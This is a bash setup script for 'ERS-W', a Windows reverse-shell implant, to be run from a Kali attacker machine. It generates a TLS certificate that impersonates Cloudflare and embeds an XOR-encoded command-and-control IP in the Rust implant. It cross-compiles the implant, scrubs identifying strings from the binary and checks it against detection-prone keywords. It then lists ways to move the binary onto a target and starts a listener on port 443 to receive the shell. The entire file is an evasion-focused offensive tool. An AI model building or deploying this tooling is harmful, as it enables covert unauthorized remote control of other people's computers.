#!/bin/bash
# ─────────────────────────────────────────────────────────────
# ERS-W Setup — Run on Kali (attacker). Does everything:
#   1. Installs dependencies (Rust cross-compile, Python, OpenSSL)
#   2. Generates TLS certs
#   3. Auto-detects IP and patches the implant
#   4. Cross-compiles for Windows and scrubs the binary
#   5. Starts the listener
#
# Usage: sudo bash setup.sh [IP]
# ─────────────────────────────────────────────────────────────

set -e

RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

DIR="$(cd "$(dirname "$0")" && pwd)"
cd "$DIR"

banner() { echo -e "\n${CYAN}[*]${NC} $1"; }
ok()     { echo -e "${GREEN}[+]${NC} $1"; }
warn()   { echo -e "${YELLOW}[!]${NC} $1"; }
fail()   { echo -e "${RED}[-]${NC} $1"; exit 1; }

# ── Check root ──
[[ $EUID -ne 0 ]] && fail "Run as root: sudo bash setup.sh"

# ── Get the real user (not root) ──
REAL_USER="${SUDO_USER:-$(logname 2>/dev/null || echo $USER)}"
REAL_HOME=$(eval echo "~$REAL_USER")

# ── Step 1: Install dependencies ──
banner "Installing dependencies..."
apt update -qq 2>/dev/null
apt install -y -qq python3-pip openssl gcc-mingw-w64-x86-64 2>/dev/null
pip install websockets -q 2>/dev/null || pip install websockets -q --break-system-packages 2>/dev/null

# Install Rust if not present
if ! sudo -u "$REAL_USER" bash -c 'command -v cargo' &>/dev/null; then
    warn "Rust not found — installing via rustup..."
    sudo -u "$REAL_USER" bash -c 'curl --proto "=https" --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y'
fi

# Add Windows cross-compile target
sudo -u "$REAL_USER" bash -c 'export PATH="$HOME/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin:$HOME/.cargo/bin:$PATH" && rustup target add x86_64-pc-windows-gnu' 2>/dev/null
ok "Dependencies installed"

# ── Step 2: Generate TLS certificate ──
banner "Generating TLS certificate..."
if [[ ! -f "$DIR/cert.pem" ]] || [[ ! -f "$DIR/key.pem" ]]; then
    openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout "$DIR/key.pem" -out "$DIR/cert.pem" \
        -days 730 -nodes \
        -subj '/C=US/ST=California/O=Cloudflare Inc/CN=cdn-wss.cloudflare.com' \
        -addext 'subjectAltName=DNS:cdn-wss.cloudflare.com,DNS:*.cloudflare.com' 2>/dev/null
    chown "$REAL_USER:$REAL_USER" "$DIR/key.pem" "$DIR/cert.pem"
    ok "TLS cert generated"
else
    ok "TLS cert already exists"
fi

# ── Step 3: Detect IP ──
banner "Detecting IP..."
if [ -n "$1" ]; then
    LIVE_IP="$1"
else
    LIVE_IP=$(ip -4 route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')
    if [ -z "$LIVE_IP" ]; then
        LIVE_IP=$(hostname -I | awk '{print $1}')
    fi
fi

[[ -z "$LIVE_IP" ]] && fail "Could not detect IP. Pass manually: sudo bash setup.sh 192.168.x.x"

IP_LEN=${#LIVE_IP}
ok "Live IP: ${GREEN}${LIVE_IP}${NC} ($IP_LEN chars)"

# ── Step 4: Patch implant with IP ──
banner "Patching implant with IP..."
PADDED_IP=$(printf "%-15s" "$LIVE_IP")
sed -i "s|const ENC_C2_HOST: \[u8; [0-9]*\] = xor_encode(b\"[^\"]*\");|const ENC_C2_HOST: [u8; 15] = xor_encode(b\"$PADDED_IP\");|" src/main.rs
ok "Patched src/main.rs with IP=$LIVE_IP"

# ── Step 4b: Compile PE resources (version info + manifest) ──
banner "Compiling PE resources..."
if [[ -f "$DIR/res/app.rc" ]]; then
    x86_64-w64-mingw32-windres "$DIR/res/app.rc" -O coff -o "$DIR/res/app.res" 2>/dev/null && ok "PE resources compiled" || warn "Resource compilation skipped"
fi

# ── Step 5: Build the implant ──
banner "Cross-compiling for Windows (release mode)..."
sudo -u "$REAL_USER" bash -c "
    cd '$DIR'
    export PATH=\"\$HOME/.rustup/toolchains/stable-x86_64-unknown-linux-gnu/bin:\$HOME/.cargo/bin:\$PATH\"
    export RUSTFLAGS='--remap-path-prefix=$REAL_HOME=. --remap-path-prefix=$DIR=.'
    cargo build --release --target x86_64-pc-windows-gnu 2>&1
"
ok "Build complete"

# ── Step 6: Scrub binary ──
banner "Scrubbing binary (removing fingerprints)..."
python3 scrub.py
BIN="target/x86_64-pc-windows-gnu/release/win_rev_shell_wss.exe"
cp "$BIN" "$DIR/ers-w.exe"
chmod +x "$DIR/ers-w.exe"
chown "$REAL_USER:$REAL_USER" "$DIR/ers-w.exe"

SIZE=$(du -h "$DIR/ers-w.exe" | cut -f1)
ok "Binary ready: ${GREEN}ers-w.exe${NC} (${SIZE})"

# ── Step 7: Verify binary is clean ──
banner "Verifying binary..."
LEAKS=$(strings "$DIR/ers-w.exe" | grep -ciE "rustls|tungstenite|openssl|certificate|websocket|/home/|cmd\.exe|SSL_|HANDSHAKE" || true)
if [[ "$LEAKS" -eq 0 ]]; then
    ok "Binary is clean — 0 sensitive strings"
else
    warn "Found $LEAKS potential string matches (check manually)"
fi

# ── Step 8: Get Kali IP for file transfer ──
KALI_IP="$LIVE_IP"

echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}  ERS-W SETUP COMPLETE${NC}"
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "  ${YELLOW}Your IP:${NC}          ${KALI_IP}"
echo -e "  ${YELLOW}Scrubbed binary:${NC}  ${DIR}/ers-w.exe"
echo -e "  ${YELLOW}Listener port:${NC}    443"
echo ""
echo -e "  ${CYAN}── DEPLOY TO WINDOWS TARGET ──${NC}"
echo ""
echo -e "  Transfer ${GREEN}ers-w.exe${NC} to the Windows machine and run it."
echo -e "  Methods:"
echo -e "    • SCP:  ${GREEN}scp ers-w.exe user@target:C:/Users/user/Desktop/${NC}"
echo -e "    • SMB:  ${GREEN}impacket-smbserver share . -smb2support${NC}"
echo -e "            On Windows: ${GREEN}copy \\\\\\\\${KALI_IP}\\\\share\\\\ers-w.exe .${NC}"
echo ""
echo -e "  ${CYAN}── WHAT HAPPENS NEXT ──${NC}"
echo ""
echo -e "  1. The listener starts automatically below"
echo -e "  2. Run ers-w.exe on the Windows target"
echo -e "  3. Shell appears here"
echo ""
echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
echo ""

# ── Step 9: Start listener ──
banner "Starting WSS listener on port 443..."
echo ""
cd "$DIR"
python3 listener.py 443
